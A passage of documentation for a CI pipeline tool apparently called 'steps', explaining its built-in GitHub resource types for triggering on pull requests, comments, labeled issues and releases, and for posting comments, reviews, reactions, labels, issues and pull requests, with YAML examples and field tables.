          echo "changed: $(git diff --name-only "$base" HEAD)"
        assert:
          stdout: "changed: feature.txt"
    assert:
      execution: [pr, changed]
      outcome: succeeded
```

**Being assigned is a trigger.** An assignment brings a pull request into the filtered set, which makes it a version the resource has never seen:

```yaml github=assigned
resources:
  - name: assigned
    type: github-prs
    source:
      repo: acme/app
      assignee: "@me"
      author: alice
      checkout: false                  # metadata only
      token_env: GH_TOKEN              # the default, shown; name another variable to act as someone else
      endpoint: https://api.github.com # the default

jobs:
  - name: pick-up
    plan:
      - get: assigned
        trigger: true
        version: every
      - task: announce
        inputs: [assigned]
        run: echo "picking up $(cat assigned/pr.url)"
        assert:
          stdout: "picking up https://github.example/acme/app/pull/42"
    assert:
      execution: [assigned, announce]
      outcome: succeeded
```

The check is one GraphQL search per poll, because the filters a pipeline asks about are search qualifiers and nothing else: GitHub's pull request listing filters on none of them.

### `github-comments`: a comment as a trigger

```yaml github=comment-command
resources:
  - name: command
    type: github-comments
    source:
      repo: acme/app
      author: [alice, carol]         # either of them; one login needs no list
      body: '^/steps\s+review\b'
      labels: [ready-for-review]     # only on pull requests carrying it
      kinds: [conversation, review]  # the default; add issue for comments on issues
      checkout: true                 # the default: the pull request's tree comes with it
      token_env: GH_TOKEN            # the default
      endpoint: https://api.github.com # the default

  - name: answer
    type: github-pr-review
    source:
      repo: acme/app

jobs:
  - name: act
    plan:
      - get: command
        trigger: true
        version: every
      - task: respond
        inputs: [command]
        outputs: [reply]
        run: |
          echo "asked by $(cat command/comment.author) on #$(cat command/pr.number): $(cat command/comment.body)" | tee reply/body.md
          test -f command/README.md
        assert:
          stdout: "asked by carol on #42: /steps review please"
      - put: answer
        inputs: [command, reply]
        params:
          body_file: reply/body.md
          from: command              # the input whose version names the pull request
          event: pending             # a draft only you can see, until you submit it
    assert:
      execution: [command, respond, answer]
      outcome: succeeded
```

| `source:` field | required | meaning |
|---|---|---|
| `repo` | yes | `owner/name` |
| `author` | no | who wrote it: one login, or a list of logins any of which may have. Compared without regard to case as GitHub compares logins; `@me` is the token's own user. `github-prs` and `github-issues` take one login only, since theirs is a search qualifier |
| `body` | no | an [RE2](https://github.com/google/re2/wiki/Syntax) pattern the text must contain a match for; `^` anchors it to the start |
| `kinds` | no | `conversation` (a pull request's timeline), `review` (inline, on a line of its diff), `issue` (an issue's timeline); default the first two |
| `checkout` | no | `false` skips the pull request's tree, `git` makes it a git repository as for `github-prs`; default `true`. An issue has no tree |
| `labels` | no | labels that must all be on the issue or pull request the comment sits on, compared without regard to case as GitHub compares label names |
| `skip_reacted` | no | a reaction (`+1`, `-1`, `laugh`, `confused`, `heart`, `hooray`, `rocket`, `eyes`) that, left by the token's own user, marks a comment done: it is not reported |
| `include` | no | what around the comment a get also writes: `conversation`, `review_comments`, `reviews`, each as `<name>.json`; default none |
| `token_env`, `endpoint` | no | as for `github-prs` |

A get writes `comment.json`, `comment.body`, `comment.id`, `comment.kind`, `comment.author` and `comment.url`. A comment on a pull request brings the pull request with it, every `pr.*` file above plus the tree at its current head, because a get cannot be told which pull request to fetch by another get's output. A comment on an issue writes `issue.json` and `issue.number` instead.

**An inline comment arrives with its thread.** `thread.json` is the review thread the comment was written in, as GitHub's comment objects: the thread's first comment, then every reply in the order they were written, the fetched comment among them. A command written as a reply says "this" about whatever the first comment said, and `comment.json` alone carries none of it. GitHub has no listing of one thread, so the get reads the pull request's inline comments and keeps the thread's; past 1000 of them the rest are not read. A conversation or an issue is not threaded, so a comment there writes no `thread.json`.

**`include` opts a get into what surrounds the comment.** A command like "the comments above are a problem elsewhere too, right?" is about comments it does not sit beside: a conversation comment pointing at inline ones, or at a review's verdict. `conversation.json` is the pull request's or issue's conversation, `review_comments.json` every inline comment on the pull request, and `reviews.json` the summaries reviewers submitted, each as GitHub's objects, oldest first, read as they are at the get and so including anything written after the command. The token user's own unsubmitted draft, which GitHub lists to that user alone, is left out: a bot answering in public would publish a review its author has not sent. Each listing stops at 1000 entries. An issue has no diff and no reviews, so it writes `conversation.json` alone. Nothing is read unasked, since every listing is pages of requests a bot that only reads its own command does not need.

```yaml github=included
resources:
  - name: command
    type: github-comments
    source:
      repo: acme/app
      body: '^/steps\s'
      checkout: false
      include: [conversation, reviews] # review_comments too, for every inline comment

jobs:
  - name: answer
    plan:
      - get: command
        trigger: true
      - task: read
        inputs: [command]
        run: |
          echo "$(grep -o '"body"' command/conversation.json | wc -l | tr -d ' ') comments, review said $(grep -o '"body":"[^"]*"' command/reviews.json)"
        assert:
          stdout: '2 comments, review said "body":"Two blocking, see inline."'
    assert:
      execution: [command, read]
      outcome: succeeded
```

**The version is `{id, kind, number, updated}`**, and `updated` is there on purpose, against the usual rule that a version carries identity only. The text is the payload here, so a comment edited from one instruction to another is new work, and an edit that stops matching `body` is not. It is also the [cursor](#the-check-cursor): each check asks GitHub only for comments written since five minutes before the newest version it last reported, newest first, one page when there is no cursor yet. The five minutes are because GitHub can list a comment a little after a newer one: asked from the cursor exactly, a comment that showed up late would sit behind it for good. What the overlap reports again is already in [version history](#version-history), which records a version once, so it starts no second build. Every page is a conditional request, and GitHub answers an unchanged listing without charging the rate limit, so a quiet repository costs nothing to poll. Inline review comments and the rest are two separate listings, so a check watching both reads them until two rounds in a row agree: read once each, a comment landing in the first after it was read could be older than one the second shows, and the cursor would pass it for good. The second round is conditional too, and a check whose listings never settle fails rather than guess, so the next one tries again. Review summaries, the text a reviewer writes when submitting, are not watched: GitHub has no listing of them across a repository.

A pipeline that comments as the same user it watches must make sure what it posts cannot match `body`, or its own reply is the next build.

**`skip_reacted` makes a mark on GitHub the record of what is done.** The cursor keeps a running daemon from reporting a comment twice, but the cursor lives in the state database, and a check with no cursor reads a page of recent comments and builds the newest of them. That is a command already answered — a deploy, a model run, a reply — run again because a file was deleted. A reaction the job leaves on its comment outlasts any database, so a comment carrying `skip_reacted` from the token's own user is not reported at all. Put it on with a [`github-reaction`](#github-reaction-marking-a-comment) put as the job's last step. Only the token's own user counts, because anybody can react with anything.

It stays cheap. A comment is looked at only after it has passed `author` and `body`, and only when GitHub's own summary on it counts at least one of that reaction; only then are its reactions of that kind listed, to see whose they are, as a conditional request like every other page. A lookup that fails fails the check, since reporting a done comment as new is exactly what the field is there to prevent. While every comment on a cursorless first page carries the mark, the check reports nothing and so keeps no cursor, and each poll reads that page again until a new command arrives.

**A reaction does not change a comment's `updated`.** Adding the mark makes no new version, so marking a comment never triggers the job again. Removing it does not bring the comment back by itself either: with a cursor, the check asks only for comments written since five minutes before the newest version it reported, so an older comment is not among them, and one inside those five minutes is already in version history. It is work again when it is edited, which is a new version anyway, or when a check with no cursor finds it on its first page.

**`labels` narrows the trigger to the issues and pull requests that carry them**, which is how a pipeline answers `/factory fix` on its own pull requests and nowhere else. On an issue, the issue's own labels are the ones that count. A comment does not say how its issue or pull request is labeled, so the check reads each one a comment sits on, once a check however many comments it holds, and only for a comment that has already passed `author` and `body`. It does so before `skip_reacted` looks, so a comment the labels refuse never has its reactions listed. The read is a conditional request like every other page. A read that fails fails the check, since reporting a comment the filter would have refused starts work nobody asked for.

**A command written before its issue or pull request carried the labels stays refused.** A command is an instruction given at a moment, and at that moment it did not qualify, so labeling afterwards does not reach back. The check keeps no list of what it refused: a label that goes on within the five-minute look-back lets the next check report the comment, since it is listed again; after that, the comment is work again only when it is edited, or when a check with no cursor finds it on its first page. To act on an older command once the label is on, write it again.

### `github-issues`: a labeled issue as a trigger

An issue list doubles as a queue: a person labels an issue `self-build`, and a pipeline picks it up, plans it, and builds it. `github-issues` finds every open issue that matches its filters:

```yaml github=labeled-issue
resources:
  - name: issue
    type: github-issues
    source:
      repo: acme/app
      labels: [self-build]
      author: alice
      assignee: "@me"                  # quoted: @ cannot start a plain YAML value
      token_env: GH_TOKEN              # the default
      endpoint: https://api.github.com # the default

  - name: state
    type: github-label
    source:
      repo: acme/app

  - name: reply
    type: github-pr-comment
    source:
      repo: acme/app

jobs:
  - name: plan
    plan:
      - get: issue
        trigger: true
        version: every                 # one build per issue, and per relabel
      - put: claimed
        resource: state
        inputs: [issue]
        params:
          add: [factory:planning]      # not a filter label, so marking the issue starts no build
      - task: read
        inputs: [issue]
        outputs: [notes]
        run: |
          echo "planning #$(cat issue/issue.number): $(cat issue/issue.title), $(grep -c '^## Comment by' issue/issue.md) comment(s)" | tee notes/body.md
        assert:
          stdout: "planning #4: Plan the cache, 2 comment(s)"
      - put: reply
        inputs: [issue, notes]
        params:
          body_file: notes/body.md     # posted on issue #4
    assert:
      execution: [issue, claimed, read, reply]
      outcome: succeeded
```

| `source:` field | required | meaning |
|---|---|---|
| `repo` | yes | `owner/name` |
| `labels` | no | labels that must all be on it; also what the version's `labeled_at` is read from |
| `author` | no | who opened it |
| `assignee` | no | someone it is assigned to |
| `token_env`, `endpoint` | no | as for `github-prs` |

`@me` in `author` or `assignee` is the token's own user. Pull requests never match, though GitHub files them as issues too. The check is one GraphQL search per poll, as for `github-prs`, and reports issues oldest first by number.

**The version is `{number, labeled_at}` when `labels` is set, and `{number}` when it is not.** `labeled_at` is when one of the filter labels last went on the issue. That is a deliberate departure from Concourse, whose versions name a thing and nothing about it, made for the same reason [`github-comments`](#github-comments-a-comment-as-a-trigger) carries `updated`: here the label is the request for work. So **taking a filter label off and putting it back asks for the work again**: it makes a new `labeled_at`, so a new version, so a new build, which is how a person retries a failed run from GitHub's own page without touching steps. Any other label changes nothing: a pipeline that marks its progress with [`github-label`](#github-label-state-labels-on-an-issue-or-pull-request) state labels such as `factory:planning` does not trigger itself. Editing the issue or commenting on it is not a new version either. Labels are matched without regard to case, as GitHub matches them. The check reads the last hundred times any label went on an issue; one relabeled more often than that since its filter label went on loses `labeled_at` and comes back as a new version once.

A get writes no tree, since an issue has none, only these:

| file | what it holds |
|---|---|
| `issue.json` | the issue, as GitHub's API describes it |
| `issue.number`, `issue.title`, `issue.url` | its number, title and page |
| `issue.comments.json` | every comment on it, oldest first, as GitHub's API describes them |
| `issue.md` | the issue to read: `# <title> (#<number>)`, its page, its body, then each comment under `## Comment by <login>, <created_at>` |

`issue.md` carries the discussion because a decision recorded in a comment after the issue was filed is part of what the work must do, and a plan built from the body alone builds the option the discussion rejected. **A get fetches the issue as it is now**, whichever version it is handed: an issue has no commit to pin it to, so a replay or a later job sees today's title, body and comments. Under a durable `--workspace-root` the [resource cache](workspace.md#cross-build-resource-cache) is on, so a version already fetched is not fetched again, so a later job sees the issue as it was when the version was first fetched instead.

A `github-pr-comment` put handed a `github-issues` get posts on that issue, as above: the type is named for pull requests, but GitHub files the comment under the issue either way, and a `github-label` put labels it the same way.

### `github-releases`: a project's releases

`github-releases` follows a repository's GitHub releases, as Concourse's [github-release](https://github.com/concourse/github-release-resource) resource does, with Concourse's filters, defaults and order. A pipeline that pins a dependency watches the upstream project's releases with it, and a new one is the trigger:

```yaml github=node-releases
resources:
  - name: node
    type: github-releases
    source:
      repo: acme/app
      semver_constraint: "~24"         # one major line: 24.x, nothing older or newer
      token_env: GH_TOKEN              # the default
      endpoint: https://api.github.com # the default

jobs:
  - name: bump
    plan:
      - get: node
        trigger: true
      - task: read
        inputs: [node]
        run: echo "bump to $(cat node/version) at $(cat node/commit_sha)"
        assert:
          stdout: "bump to 24.22.3 at c0ffee0000000000000000000000000000000003"
    assert:
      execution: [node, read]
      outcome: succeeded
```

Here the repository has releases on three major lines, a release candidate, a draft, and `v27.0.0-alpha.0.1.1`, an alpha GitHub was not told is a pre-release; `~24` keeps the 24.x finals alone, and the newest of them is `v24.22.3`.

| `source:` field | required | meaning |
|---|---|---|
| `repo` | yes | `owner/name` |
| `tag_filter` | no | an RE2 pattern a release's tag must match; its **last** capture group is the version, or the whole match when it has none. `^v?([^v].*)` when unset: an optional leading `v`, then the version |
| `version_template` | no | builds the version from `tag_filter`'s groups instead: `$1.$2.$3`, `${major}`. steps' own, below |
| `order_by` | no | `version` (the default): by the version read from the tag; `time`: by when the release was published, or created for a draft |
| `semver_constraint` | no | keeps the releases whose version satisfies it, such as `~24`, `^1.2` or `>= 1.2, < 3`, in [Masterminds/semver](https://github.com/Masterminds/semver#checking-version-constraints)'s syntax; a version that is not semver is dropped |
| `release` | no | finds final releases; `true` when unset |
| `pre_release` | no | finds pre-releases too; `false` when unset. With `release: false`, pre-releases alone |
| `drafts` | no | finds drafts and nothing else; `false` when unset. Seeing them takes a token with push access |
| `token_env`, `endpoint` | no | as for `github-prs` |

`release: false` with `pre_release: false` is refused when the pipeline loads: it finds nothing. (Concourse's check finds everything under that pair, finals and pre-releases alike, which is not what anyone writing two falses means.)

**The check is Concourse's.** It lists the repository's releases, drops the ones the filters refuse, and sorts the rest oldest first: by version, compared the way Concourse compares them, so `v2` comes before `v10` and `1.0.0-rc.1` before `1.0.0`; or by time. With no [cursor](#the-check-cursor), which is every `steps run` and a daemon's first poll, it reports the newest release alone. After that it reports every release from the cursor's place on. So **a release that sorts below the newest one already seen is never reported**, however recently it was published: a resource following every Node release, with no constraint, does not build `v22.23.6` published after `v24.22.4`. Follow each line with its own resource and constraint when every line matters. Under `order_by: version` a tag the filter matches must still read as a version (digits and letters in dot-separated parts, an optional `-pre-release` and `+build`); one that does not is skipped. Every page of the listing is a conditional request, so an unchanged repository costs no rate limit, and the listing stops at 1000 releases, the newest.

**The version is `{id, tag, timestamp}`**, Concourse's shape: the release's id, its tag, and when it was published. The timestamp is the cursor `order_by: time` reads and does not change once a release is out; editing a release's notes is no new version.

A get writes Concourse's files, under Concourse's names, so a task ported from a Concourse pipeline reads them unchanged:

| file | what it holds |
|---|---|
| `tag` | the release's tag, `v24.22.3` |
| `version` | the version `tag_filter` (and `version_template`) read from it, `24.22.3` |
| `commit_sha` | the commit the tag points at, through an annotated tag; not written for a draft, whose tag need not exist yet |
| `body` | the release notes; not written when there are none |
| `timestamp` | when it was published, or created for a draft, in RFC 3339 |
| `url` | its page |
| `release.json` | the release, as GitHub's API describes it |

The get finds the release by its id and, when that id is gone, by its tag, so a release deleted and published again under the same tag is still the version's release. It downloads no assets and no source archive yet: Concourse's `globs`, `include_source_tarball` and `include_source_zip` are get `params:`, and no built-in get takes `params:` here.

#### `version_template`: a version spelled in pieces

Some projects spell one version two ways. ruby/ruby tags `v4.0.10`, and before 4.0 `v3_4_13`. Concourse's version is one capture group, and no single group can turn `3_4_13` into `3.4.13`: the default filter reads it as one word, which is no semver, so `semver_constraint` drops it, and which sorts above every number, so `v3_4_9` would be the newest Ruby. `version_template` joins the groups instead, `$1.$2.$3` as Go's `Regexp.Expand` reads it (`${1}` where a letter or digit follows):

```yaml github=ruby-releases
resources:
  - name: ruby
    type: github-releases
    source:
      repo: acme/app
      tag_filter: '^v(\d+)(?:\.|_)(\d+)(?:\.|_)(\d+)$'   # 4.0.10 or 3_4_13
      version_template: "$1.$2.$3"
      semver_constraint: "~3.4"

jobs:
  - name: bump
    plan:
      - get: ruby
        trigger: true
      - task: read
        inputs: [ruby]
        run: echo "$(cat ruby/tag) is $(cat ruby/version)"
        assert:
          stdout: "v3_4_13 is 3.4.13"
    assert:
      execution: [ruby, read]
      outcome: succeeded
```

`v3_4_9` and `v3_4_13` both read as 3.4.x, and 13 is newer than 9. The filter's anchors keep `v4.1.0-preview1` out, and the constraint keeps the 4.0 line out. A template naming a group the filter does not have is refused when the pipeline loads, since every tag would read as the same version. With no template, a filter's last group is the version, as in Concourse.

**Pre-releases, newest first by time.** `order_by: time` with `release: false` follows a project's release candidates in the order they were cut, whatever their versions:

```yaml github=node-releases
resources:
  - name: candidate
    type: github-releases
    source:
      repo: acme/app
      order_by: time
      release: false
      pre_release: true
      drafts: false                    # the default; true finds drafts alone

jobs:
  - name: try
    plan:
      - get: candidate
        trigger: true
      - task: read
        inputs: [candidate]
        run: cat candidate/tag
        assert:
          stdout: "v24.23.0-rc.1"
    assert:
      execution: [candidate, read]
      outcome: succeeded
```

### `github-pr-comment` and `github-pr-review`: publishing

Both take `repo`, `token_env` and `endpoint` in `source:` and nothing else, and find which pull request a put is about in its inputs: the one input whose version names a pull request, which every `github-prs` and `github-comments` get's does, and a `github-issues` get's names an issue the same way. `params.from` picks one when several do, and `params.number` names one outright for a put with none:

```yaml github=post-fixed
resources:
  - name: tracking
    type: github-pr-comment
    source:
      repo: acme/app
      token_env: GH_TOKEN              # the default; name another variable to post as someone else
      endpoint: https://api.github.com # the default

  - name: verdict
    type: github-pr-review
    source:
      repo: acme/app

jobs:
  - name: report
    plan:
      - task: summarize
        outputs: [report]
        run: |
          echo "all green" > report/body.md
          echo '[{"path": "app/a.rb", "line": 12, "body": "nice guard"}]' > report/comments.json
      - put: tracking
        inputs: [report]
        params:
          body_file: report/body.md
          number: "42"
      - put: verdict
        inputs: [report]
        params:
          body_file: report/body.md
          number: "42"
          event: approve
          comments_file: report/comments.json   # each comment on its line of the diff
    assert:
      execution: [summarize, tracking, verdict]
      outcome: succeeded
```

| `params:` field | put | meaning |
|---|---|---|
| `body_file` | both | the text to post, a path inside the put's inputs; an empty file is refused, since posting nothing is how a step that wrote nothing would otherwise look |
| `from` | both | the input whose version names the pull request, when more than one does; with `in_thread`, the `github-comments` get whose comment it answers |
| `number` | both | the pull request, when no input names it; not with `in_thread` |
| `in_thread` | `github-pr-comment` | `true` answers the comment a `github-comments` get fetched where it was written: an inline comment in its thread, any other kind in the conversation |
| `event` | `github-pr-review` | `comment` (the default), `approve`, `request_changes`, or `pending` |
| `comments_file` | `github-pr-review` | a JSON array of comments on lines of the diff, posted in the same review: `[{"path": "app/a.rb", "line": 12, "body": "..."}]`, with `start_line` for a range and `side: LEFT` for a removed line; an empty array posts the body alone |

`github-pr-comment` posts to the pull request's conversation, or with `in_thread` to an inline comment's thread, as below. `github-pr-review` posts a review on the commit its input fetched when the input is a `github-prs` get, so a push after the fetch does not move the review onto code nobody read. **`event: pending` drafts a review only the token's user can see** until they submit it, and replaces that user's own earlier draft, since GitHub allows one per user per pull request, so a new push's draft takes the old one's place. Nobody else's draft is touched. GitHub refuses an approval or a change request from a pull request's own author; post a comment there instead.

**`comments_file` puts each comment on its line**, so the author reads it beside the code instead of looking a `path:line` up. `line` is the line in the file, not a position in the diff. The file is read and checked before anything is sent, unknown fields included, so a `file:` written for `path:` fails the put by name, and a pending put never deletes the last draft only to fail on the next. Whether a line is in the diff is GitHub's call, since only it knows which lines a review may sit on, and it refuses the whole review if one is not: check the lines against `pr.diff` in a task before the put when a model chose them.

**`in_thread: true` answers a comment where it was asked.** A command written on a line of the diff gets its answer in that line's thread, beside the code, rather than in a conversation the asker has to go and find:

```yaml github=thread
resources:
  - name: question
    type: github-comments
    source:
      repo: acme/app
      body: '^/steps\s+explain\b'
      checkout: false

  - name: answer
    type: github-pr-comment
    source:
      repo: acme/app

jobs:
  - name: explain
    plan:
      - get: question
        trigger: true
        version: every
      - task: write
        inputs: [question]
        outputs: [reply]
        run: |
          echo "looking into $(cat question/comment.kind) comment $(cat question/comment.id)" | tee reply/body.md
        assert:
          stdout: "looking into review comment 702"
      - put: answer
        inputs: [question, reply]
        params:
          body_file: reply/body.md
          in_thread: true            # an inline comment's thread; the conversation for any other kind
          from: question             # optional here: question is the only input naming a comment
    assert:
      execution: [question, write, answer]
      outcome: succeeded
```

The comment comes from a `github-comments` input and nothing else, as for [`github-reaction`](#github-reaction-marking-a-comment): a put whose inputs hold no such get is refused at load, as is a `from` naming one that is not, and so is `number`, which names a pull request with no comment in it to answer. **Only an inline comment has a thread.** A pull request's conversation and an issue's are flat, so a comment there is answered in the conversation, exactly as without the flag. That is deliberate: a pipeline watching both kinds sets `in_thread` once and gets the right place for each. GitHub's reply route takes only a thread's first comment, while a command is as often written as a reply further down, so the put reads the comment first and answers under the comment that started its thread; the answer lands at the bottom of the same thread either way. The put's version is `{id, number}` with or without the flag: the comment it posted, and the pull request or issue it is on.

### `github-reaction`: marking a comment

A reaction is how a bot says "seen" and "done" on the comment that asked, without a reply in the conversation for every command. `github-reaction` puts one on, takes the token's own one off, or both in one put, on the comment a `github-comments` get fetched:

```yaml github=reaction
resources:
  - name: command
    type: github-comments
    source:
      repo: acme/app
      author: alice
      body: '^/steps\s+deploy\b'
      checkout: false
      skip_reacted: rocket           # the done mark, when the token's own user left it

  - name: mark
    type: github-reaction
    source:
      repo: acme/app
      token_env: GH_TOKEN            # the default; whose reactions these are
      endpoint: https://api.github.com # the default

jobs:
  - name: deploy
    plan:
      - get: command
        trigger: true
        version: every
      - put: seen
        resource: mark
        inputs: [command]
        params:
          add: eyes                  # picked up, before the work starts
      - task: work
        inputs: [command]
        run: |
          echo "deploying for $(cat command/comment.author): $(cat command/comment.body)"
        assert:
          stdout: "deploying for alice: /steps deploy prod"
      - put: done
        resource: mark
        inputs: [command]
        params:
          add: rocket                # done, and the mark skip_reacted reads
          remove: eyes               # the token's own eyes; anybody else's stay
          from: command              # optional here: command is the only input naming a comment
    assert:
      execution: [command, seen, work, done]
      outcome: succeeded
```

| `params:` field | meaning |
|---|---|
| `add` | a reaction to put on: `+1`, `-1`, `laugh`, `confused`, `heart`, `hooray`, `rocket` or `eyes`. Quote `"+1"` and `"-1"`: unquoted, YAML reads them as numbers |
| `remove` | a reaction of the token's own user to take off, from the same set |
| `from` | the `github-comments` get whose comment this marks, when more than one input names one |

At least one of `add` and `remove` is required, and the set is GitHub's, not Slack's: `white_check_mark` is a load error naming the eight there are. **The comment comes from a `github-comments` input and nothing else**, so a put whose inputs hold no such get is refused at load, as is a `from` naming one that is not. The version carries the comment's kind as well as its id, and the kind picks the route: an inline review comment's reactions live under the pull request's comments, every other kind's under the issue's, and the same id on the wrong route is somebody else's comment or none.

**`add` goes before `remove`**, so a swap from `eyes` to `rocket` that fails halfway leaves both marks rather than neither, and a comment with no mark reads as one nobody picked up. **`remove` touches only the token user's own reaction**: the put lists that reaction on the comment, finds the one the token's user left, and deletes that one by id, so somebody else's `eyes` stays where they put it. **Marking twice is not an error.** GitHub answers an add that is already there with the reaction that is, and a remove finds nothing when it is already gone; both are the comment in the state asked for, which a replay or a resume always finds, the way `slack-reaction` reads `already_reacted`. Any other answer fails the put with GitHub's status, its words and the route.

A put's version is `{comment, add, remove}`, recorded in the reaction resource's own history and never in the comments one, which is why a mark cannot trigger anything.

### `github-label`: state labels on an issue or pull request

A label is how a pipeline shows where a piece of work is, so the issue list doubles as a board: `factory:queued`, then `factory:building`, then done. `github-label` puts labels on, takes them off, or both in one put, on the issue or pull request an input names:

```yaml github=label
resources:
  - name: pr
    type: github-prs
    source:
      repo: acme/app
      labels: [ready-for-review]
      checkout: false

  - name: state
    type: github-label
    source:
      repo: acme/app

jobs:
  - name: build
    plan:
      - get: pr
        trigger: true
        version: every
      - put: claimed
        resource: state
        inputs: [pr]
        params:
          add: [factory:building]
          remove: [factory:queued, factory:failed]   # failed is not on it: already gone is success
          from: pr                               # optional here: pr is the only input naming one
      - task: work
        inputs: [pr]
        run: |
          echo "building #$(cat pr/pr.number)"
        assert:
          stdout: "building #42"
      - put: tracker
        resource: state
        params:
          number: "12"                           # the release issue, which no input names
          add: [has-builds]
    assert:
      execution: [pr, claimed, work, tracker]
      outcome: succeeded
```

| `params:` field | meaning |
|---|---|
| `add` | a list of labels to put on; one the repository does not have yet, GitHub creates |
| `remove` | a list of labels to take off |
| `from` | the get whose version names the issue or pull request, when more than one input names one |
| `number` | the issue or pull request, when no input names it; not with `from` |

At least one of `add` and `remove` is required, and both are lists even for one label: a state change can take off several. A label in both is a load error, compared without regard to case as GitHub compares label names, since the remove would take the add straight back off. **Any input whose version carries a `number` names the issue or pull request**: a `github-prs`, `github-comments` or `github-issues` get, or a type of your own whose versions do. A put with no get among its inputs and no `number` is refused at load, as is a `from` naming something that is not a get among them.

**`add` goes before `remove`**, so a swap from `factory:queued` to `factory:building` that fails halfway leaves both labels rather than neither, and an issue with no state label has fallen off the board. **Adding a label the repository has never had creates it**, in GitHub's default color: GitHub does that, and steps does not fight it, so a misspelt state shows up as a new label on the repository's label page rather than as an error. **Removing a label that is not there is not an error**: it is the issue in the state asked for, which a replay or a resume always finds. GitHub answers that with a 404 saying `Label does not exist`, and it answers an issue or repository that is not there with a 404 too, saying `Not Found`; the message is all that tells them apart, so only the first counts as success. Every label anybody else put on stays where it is. Any other answer fails the put with GitHub's status, its words and the route.

A put's version is `{number, add, remove}`, each list joined with commas, and a side the put did not ask for left out, as for `github-reaction`. It lands in the label resource's own history, so a label put cannot trigger anything by itself.

### `github-issue`: opening an issue

`github-issue` opens one issue per put, titled and written from files a step produced. One put, one issue, one version, like every other publisher; a pipeline that opens several runs the put once per item with [`across:`](control-flow.md#one-put-per-item), whose vars render into `params:`. That is the shape it is for: a step breaks the work down, writes one title and body per piece and a list naming them, and the matrix opens one issue each:

```yaml github=issues
resources:
  - name: children
    type: github-issue
    source:
      repo: acme/app
      token_env: GH_TOKEN            # the default; who opens the issues
      endpoint: https://api.github.com # the default

jobs:
  - name: break-down
    plan:
      - task: plan
        outputs: [plan]
        run: |
          printf '["login","search","docs"]' > plan/items.json
          for c in login search docs; do
            echo "Split out: $c" > plan/$c.title
            echo "Part of #42" > plan/$c.md
          done
      - put: children
        across:
          - var: child
            from_file: plan/items.json
        inputs: [plan]
        params:
          title_file: plan/{{ .vars.child }}.title   # each cell its own
          body_file: plan/{{ .vars.child }}.md
          labels: [factory, "{{ .vars.child }}"]
          assignees: [octocat]
    assert:
      execution:
        - plan
        - children [child=login]
        - children [child=search]
        - children [child=docs]
      outcome: succeeded
```

| `params:` field | meaning |
|---|---|
| `title_file` | the title, a path inside the put's inputs. One line: the trailing newline is dropped, and a file with a second line fails the put rather than being cut, since that is a body written to the wrong file |
| `body_file` | the issue's text, a path inside the put's inputs; an empty file is refused, as for `github-pr-comment` |
| `labels` | labels put on the issue as it opens. GitHub creates a label the repository does not have yet, in its default color |
| `assignees` | logins the issue is assigned to. `@me` is refused: GitHub assigns by login |

A get of a `github-issue` resource is refused at load, as for every publisher. The put's version is `{id, number}`: the issue GitHub opened, by its id and by the number people write as `#N`.

**Nothing dedupes.** A put that is retried or run again opens a second issue, exactly as a retried `github-pr-comment` posts a second comment: GitHub has no "open this unless it exists", and a title is no identity, since two children may share one. Guard it in the pipeline, where the identity is known: have the step that writes the list search the repository first and leave out any child already open, for instance one whose body carries the same `Part of #42` marker, so a re-run opens only what is missing.

### `github-pr`: opening or updating a pull request

`github-pr` opens a pull request for a branch that is already pushed, or updates the one that is already open for it. Pushing is the [`git`](#the-built-in-git-type) type's put; this is the step after, so no `gh pr create` is needed. The put looks for an **open** pull request in `source.repo` whose head is `params.head`, and then does one of two things:

- **None is open:** it opens one, from `title_file` and `body_file`, onto `base` (or the repository's default branch), as a draft when `draft` is set, with the `labels` and `assignees` given. Both files are required here, and the put fails naming the one that is missing.
- **One is open:** it rewrites the title and the description from whichever of the two files were given, and with neither given it changes nothing. `draft`, `labels` and `assignees` are not applied again, so a person's edits to them survive the next put.

Then, when `ready` is set and the pull request is still a draft, it is marked ready for review.

```yaml github=pr
resources:
  - name: pr
    type: github-pr
    source:
      repo: acme/app
      token_env: GH_TOKEN            # the default; who opens the pull request
      endpoint: https://api.github.com # the default

jobs:
  - name: publish
    plan:
      - task: describe
        outputs: [description]
        run: |
          echo "Add the widget cache" > description/title
          printf 'Widgets are now cached.\n' > description/body.md
      - put: pr
        inputs: [description]
        params:
          head: feature/widget-cache # already pushed to acme/app
          base: main                 # unset: the repository's default branch
          title_file: description/title
          body_file: description/body.md
          draft: true
          labels: [factory]
          assignees: [octocat]
    assert:
      execution:
        - describe
        - pr
      outcome: succeeded
```

A later put for the same branch is an update, not a second pull request. `ready` is how a pipeline that opens a draft, reviews it, and only then asks people to look, finishes:

```yaml github=pr-ready
resources:
  - name: pr
    type: github-pr
    source:
      repo: acme/app

jobs:
  - name: publish
    plan:
      - put: pr
        params:
          head: feature/widget-cache
          ready: true
    assert:
      execution:
        - pr
      outcome: succeeded
```

| `params:` field | meaning |
|---|---|
| `head` | required. The branch the pull request is from, already pushed to `source.repo`. A fork's `owner:branch` is refused at load: only branches of the repository itself |
| `base` | the branch it merges into. Unset, a new pull request targets the repository's default branch. Given for an open pull request, it must be the base it already has, or the put fails: a put never retargets |
| `title_file` | the title, a path inside the put's inputs. One line, as for `github-issue` |
| `body_file` | the description, a path inside the put's inputs; an empty file is refused |
| `draft` | opens a new pull request as a draft. Default false. With `ready` it is a load error: one asks for a draft and the other for none |
| `labels`, `assignees` | as for `github-issue`, applied when the put opens the pull request |
| `ready` | when true and the pull request is a draft, marks it ready for review. Default false |

A get of a `github-pr` resource is refused at load, as for every publisher. The put's version is `{number, sha}`: the pull request's number and its head commit as GitHub reports it, the same shape `github-prs` uses, in the `github-pr` resource's own history.

**This put is idempotent, which `github-issue` is not.** A title is no identity, so an issue put that runs twice opens two. A head branch is one: GitHub allows one open pull request per head and base, so a retried or repeated put finds the pull request it opened and updates it. A closed or merged one is not found, so pushing the branch again after a merge and putting opens a new one. A head with several open pull requests (onto different bases) is refused rather than guessed at.

Marking ready is a GraphQL mutation, since REST cannot do it; the token needs the same write access to pull requests as for the rest.

## The built-in Linear types

Three built-ins, split the way the GitHub ones are. `linear-issues` **finds work**: it has a check and an in, and no out. `linear-comment` and `linear-update` **publish**: they have an out and nothing else, so a comment a pipeline posts never lands in the history it triggers from.

steps calls Linear's GraphQL API itself: there is no `resource_types:` block, no GraphQL in the pipeline, no `curl` or `jq`. All three read the key from `LINEAR_API_KEY`; `source.token_env` names another variable, for a second identity. A personal API key (`lin_api_...`) is sent bare, as Linear expects, and any other token as an OAuth `Bearer` token. `steps validate` refuses a pipeline whose key variable is unset, before anything runs. `source.endpoint` is Linear's GraphQL URL; plain `http` is accepted only for a loopback host, so a key never travels in cleartext.

